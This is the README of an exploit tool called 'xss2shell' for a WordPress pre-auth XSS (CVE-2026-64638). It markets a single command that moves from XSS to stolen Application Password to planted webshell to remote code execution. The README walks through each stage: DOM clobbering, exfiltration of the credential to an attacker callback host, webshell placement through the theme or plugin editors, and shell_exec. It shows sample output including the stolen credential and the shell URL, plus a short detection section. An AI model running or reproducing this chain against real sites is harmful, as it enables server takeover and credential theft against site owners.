<div align="center">

```
 ██╗  ██╗███████╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
 ╚██╗██╔╝██╔════╝██╔════╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
  ╚███╔╝ ███████╗███████╗ █████╔╝███████╗███████║█████╗  ██║     ██║
  ██╔██╗ ╚════██║╚════██║██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
 ██╔╝ ██╗███████║███████║███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

**One XSS. Full RCE. No authentication required.**

[![CVE](https://img.shields.io/badge/CVE--2026--64638-CRITICAL-red?style=for-the-badge)](https://nvd.nist.gov/vuln/detail/CVE-2026-64638)
[![WordPress](https://img.shields.io/badge/WordPress-%3C_7.0.3-blue?style=for-the-badge&logo=wordpress)](https://wordpress.org)
[![Python](https://img.shields.io/badge/Python-3.8+-yellow?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

Every public PoC for this CVE is broken. This one works.

[Quick Start](#quick-start) · [How It Works](#how-it-works) · [Limitations](#limitations)

---

</div>

## The Bug

WordPress < 7.0.3 does not sanitize the `log` (username) parameter in `wp-login.php`. The value is stored and rendered inside the admin's authenticated session — a pre-auth stored XSS that chains directly to full server takeover.

## The Chain

```
 ┌──────────────────────┐
 │ Admin clicks lure URL │
 └──────────┬───────────┘
            ▼
 ┌──────────────────────┐
 │ Stored XSS fires in  │
 │ wp-login.php          │
 └──────────┬───────────┘
            ▼
 ┌──────────────────────┐
 │ Application Password │
 │ silently stolen       │
 └──────────┬───────────┘
            ▼
 ┌──────────────────────┐
 │ Webshell written via │
 │ theme/plugin editor   │
 └──────────┬───────────┘
            ▼
 ┌──────────────────────┐
 │   Remote Code        │
 │   Execution ✓        │
 └──────────────────────┘
```

**4 steps. 1 click. Full compromise.**

## Quick Start

```bash
# Zero dependencies. Pure Python 3.
python xss2shell.py -t http://target.com -c "id"
```

```
 ██╗  ██╗███████╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
 ╚██╗██╔╝██╔════╝██╔════╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
  ╚███╔╝ ███████╗███████╗ █████╔╝███████╗███████║█████╗  ██║     ██║
  ██╔██╗ ╚════██║╚════██║██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
 ██╔╝ ██╗███████║███████║███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

 CVE-2026-64638 | WordPress < 7.0.3 | Pre-Auth XSS → RCE
 https://wordsec.net | For authorized testing only

[*] Target: http://target.com
[+] WordPress login found
[+] Listening on 192.168.1.5:9443
[*] Send this to the admin → http://192.168.1.5:9443/
[*] Waiting for victim ...
[+] Victim opened the attacker page
[+] Exploit chain started in victim's browser
[+] XSS payload armed
[+] XSS payload POSTed to wp-login.php
[+] Application Password stolen: user=admin pass=XXXX XXXX XXXX XXXX
[+] Theme editor → webshell in functions.php

============================================================
[+] RCE via theme
[+] $ id
------------------------------------------------------------
uid=33(www-data) gid=33(www-data) groups=33(www-data)
============================================================

[+] Shell → http://target.com/?xss2shell_cmd=whoami
[+] Done.
```

## Usage

```
usage: xss2shell.py [-h] -t TARGET -c COMMAND [--lhost LHOST] [--lport LPORT] [--keep]

options:
  -t, --target    Target WordPress URL (http://target.com)
  -c, --command   OS command to execute on the server
  --lhost         Attacker callback IP (default: auto-detect)
  --lport         Attacker callback port (default: random)
  --keep          Don't clean up artifacts after exploitation
  --version       Show version
```

## How It Works

### Stage 1 — XSS via `wp-login.php`

The attacker hosts a page that opens a popup to `wp-login.php` with a crafted `log` parameter. The payload uses **DOM clobbering** (`<area id=ajaxurl>`) to hijack WordPress's internal AJAX URL, redirecting a JSONP callback to auto-click the Application Password approval button via `window.opener`.

### Stage 2 — Application Password Theft

The parent window navigates to `authorize-application.php` with a pre-registered `app_id` and a `success_url` pointing to the attacker's server. When the JSONP fires `window.opener.approve.click`, the Application Password is silently created and exfiltrated.

### Stage 3 — Shell Deployment

Three fallback methods ensure RCE even on hardened configurations:

| # | Method | Target | Writes to |
|---|--------|--------|-----------|
| 1 | Theme Editor | `theme-editor.php` | `functions.php` |
| 2 | Plugin Upload | `update.php?action=upload-plugin` | `xss2shell/shell.php` |
| 3 | Plugin Editor | `plugin-editor.php` | Existing plugin file |

Each method extracts the CSRF nonce from the admin panel and injects PHP code server-side.

### Stage 4 — RCE

The webshell executes OS commands via `shell_exec()` and returns output as JSON. The tool confirms execution, runs the attacker's command, and optionally cleans up all artifacts.

## Affected Versions

| Version | Status |
|---------|--------|
| WordPress **< 7.0.3** | **Vulnerable** |
| WordPress ≥ 7.0.3 | Patched |

## Limitations

| Condition | Impact |
|-----------|--------|
| `DISALLOW_FILE_EDIT` | Theme/plugin editors blocked → only ZIP upload works |
| `DISALLOW_FILE_MODS` | All 3 methods blocked → no RCE |
| WAF (Cloudflare, Wordfence) | May filter XSS payload or webshell requests |
| `disable_functions` | `shell_exec` blocked → empty output |
| Pop-up blocker | Breaks the popup chain |
| Strict CSP | Blocks inline JS or cross-origin fetch |

## Detection

If xss2shell was used against your site, look for:

- Application Password for app `XSS2Shell-Poc-Wordsec`
- Plugin `xss2shell` in `wp-content/plugins/`
- String `xss2shell_cmd` in `functions.php` or any plugin file
- JSONP requests to `/?rest_route=/&_method=GET&_jsonp=`

## Why This Exists

Every public PoC for CVE-2026-64638:
- Stops at `alert(1)` — proves nothing
- Requires manual steps a triager can't reproduce
- Breaks on default WordPress installs

This tool delivers **full exploitation in a single command**. Built for security researchers who need a working PoC, not a write-up.

## Disclaimer

For **authorized security testing and educational purposes only**. Only use against systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.

## Credits

**[WordSec](https://wordsec.net/)** · CVE-2026-64638 · Patched in WordPress 7.0.3

---

<div align="center">

**If this saved your research time, star it.** ⭐

</div>
